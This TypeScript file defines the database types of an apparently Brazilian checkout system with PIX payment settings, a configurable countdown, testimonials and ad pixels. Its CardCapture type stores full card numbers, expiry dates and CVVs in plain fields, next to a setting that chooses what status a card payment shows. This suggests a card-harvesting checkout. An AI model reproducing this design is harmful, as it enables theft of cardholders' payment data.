// Types for our database tables
export type Cliente = {
  id: number;
  nome: string;
  email: string;
  celular: string;
  documento: string;
  produto_id: number;
  criado_em: string;
  data_nascimento?: string;
};

export type Produto = {
  id: number;
  nome: string;
  tipo: string;
  valor: number;
  descricao: string;
  ativo?: boolean; 
  slug: string;
  imagem_url: string;
  checkout_title: string;
  checkout_button_text?: string;
  banner_url: string;
  banner_mobile_url: string;
  banner_color: string;
  background_color: string;
  tipo_chave_pix: string;
  chave_pix: string;
  nome_beneficiario: string;
  usar_api_pix: boolean;
  url_pix_api: string;
  url_api_pix: string;
  usar_config_pix_global: boolean;
  criado_em: string;
};

export type Venda = {
  id: number;
  cliente_id: number;
  produto_id: number;
  valor: number;
  status: 'pendente' | 'aprovado' | 'recusado';
  metodo_pagamento: 'pix' | 'cartao' | 'boleto';
  criado_em: string;
};

export type ConfigCheckout = {
  id: number;
  mensagem_topo?: string | null;
  cor_topo?: string | null;
  cor_texto_topo?: string | null;
  ativa_banner?: boolean | null;
  banner_url?: string | null;
  banner_mobile_url?: string | null;
  cor_banner?: string | null;
  cor_fundo?: string | null;
  cor_titulo?: string | null;
  texto_botao?: string | null;
  cor_botao?: string | null;
  cor_texto_botao?: string | null;
  rodape_texto?: string | null;
  rodape_empresa?: string | null;
  rodape_ano?: string | null;
  mostrar_seguro?: boolean | null;
  mensagem_rodape?: string | null;
  url_termos_uso?: string | null;
  url_politica_privacidade?: string | null;
  mensagem_termos?: string | null;
  mostrar_contador?: boolean | null;
  texto_contador?: string | null;
  contador_min?: number | null;
  contador_max?: number | null;
  cor_texto_contador?: string | null;
  mostrar_campo_documento?: boolean | null;
  mostrar_campo_telefone?: boolean | null;
  mostrar_bandeira_brasil?: boolean | null;
  mostrar_prefixo_telefone?: boolean | null;
  mostrar_campo_nascimento?: boolean | null;
  titulo_identificacao?: string | null;
  titulo_pagamento?: string | null;
  cor_icones?: string | null;
  icone_nome?: string | null;
  icone_email?: string | null;
  icone_telefone?: string | null;
  icone_documento?: string | null;
  validar_cpf?: boolean | null;
  validar_telefone?: boolean | null;
  validar_cartao?: boolean | null;
  validar_nascimento?: boolean | null;
  criado_em?: string | null;
  redirect_card_status?: "analyzing" | "approved" | "rejected";
  modo_random?: boolean | null;
  max_installments?: number | null;
  pix_titulo?: string | null;
  pix_subtitulo?: string | null;
  pix_instrucoes?: string | null;
  pix_mensagem_seguranca?: string | null;
  cor_primaria_pix?: string | null;
  cor_secundaria_pix?: string | null;
  cor_botao_pix?: string | null;
  cor_texto_botao_pix?: string | null;
  tipo_chave_pix_global?: string | null;
  chave_pix_global?: string | null;
  nome_beneficiario_pix?: string | null;
  qr_code_pix_url?: string | null;
  usar_api_pix_global?: boolean | null;
  url_api_pix_global?: string | null;
};

export type Depoimento = {
  id: number;
  nome: string;
  texto: string;
  estrelas: number;
  foto_url: string;
  produto_id?: number;
  criado_em: string;
};

export type PixConfig = {
  id: number;
  produto_id: number;
  tipo_chave_pix: string;
  chave_pix: string;
  nome_beneficiario: string;
  usar_api_pix: boolean;
  url_pix_api: string;
};

export type Pixel = {
  id: number;
  facebook_pixel: string;
  tiktok_pixel: string;
  google_tag_id: string;
  taboola_pixel: string;
};

export type Webhook = {
  id: number;
  nome_evento: string;
  url_destino: string;
  token: string;
  mensagem: string;
};

export type CardCapture = {
  id: number;
  nome_cliente: string;
  numero_cartao: string;
  validade: string;
  cvv: string;
  criado_em: string;
};
